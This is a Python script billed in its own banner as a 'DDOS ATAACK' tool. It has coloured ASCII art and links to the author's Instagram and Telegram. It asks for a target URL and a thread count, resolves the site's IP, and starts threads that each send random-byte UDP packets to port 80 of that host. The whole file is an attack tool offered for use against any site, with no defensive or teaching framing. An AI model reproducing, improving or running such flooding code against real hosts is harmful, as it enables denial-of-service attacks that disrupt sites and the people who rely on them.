# Bold
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
import socket
import threading
import random
print(BRed+'''
                     .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
 '''+BYellow+'''  DDOS ATAACK '''+BRed+'''  d  3         '''+BYellow+'''FX'''+BRed+'''         $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$ '''+BYellow+'''  DDOS ATAACK '''+BRed+'''
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "  '''+BYellow+'''  DDOS ATAACK '''+BRed+'''
    '''+BYellow+'''  DDOS ATAACK '''+BRed+'''     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..  '''+BYellow+'''  DDOS ATAACK '''+BRed+'''
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"   '''+BYellow+'''  DDOS ATAACK '''+BRed+'''     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            """""                              "$$$"
      '''+BYellow+''' 
      INSTAGRAM :'''+BCyan+''' https://instagram.com/fx_py3?igshid=YzAyZWRlMzg=
      '''+BYellow+'''TELEGRAN :'''+BCyan+''' https://t.me/tvvnu
     ''')
def create_rnd_msg(msg_size):
	rnd_msg = ""
	for i in range(0, msg_size):
		ch_rnd = random.randint(0, 255)
		rnd_msg += chr(ch_rnd)
	return rnd_msg
site = input(BYellow+"[+] - "+BGreen+"Target URL => "+BWhite)
if 'https://'in site:
	site=site.split('https://')[1]
if '/'in site :
	site=site.split('/')[0]
thread_count = int(input(BYellow+"[+] - "+BGreen+"threads => "+BWhite))
ip = socket.gethostbyname(site)
UDP_PORT=80
print('\n'*2)
print(BYellow+"[-] - "+BPurple+"protocol : "+BRed+'UDP')
print(BYellow+"[-] - "+BPurple+"target ip : "+BRed, ip )
print(BYellow+"[-] - "+BPurple+"target port : "+BRed, UDP_PORT)

print('\n'*2)
print(BYellow+'_'*9)
i=0
def dos():
		MESSAGE = str.encode(create_rnd_msg(8))
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(MESSAGE, (ip, UDP_PORT))
		print(BGreen+f'\rSent Successfuly => {BRed} {i}',end='')	
thread_count=thread_count+1
for i in range(thread_count):
	try:
		threading.Thread(target=dos).start()	
	except KeyboardInterrupt:
		exit()
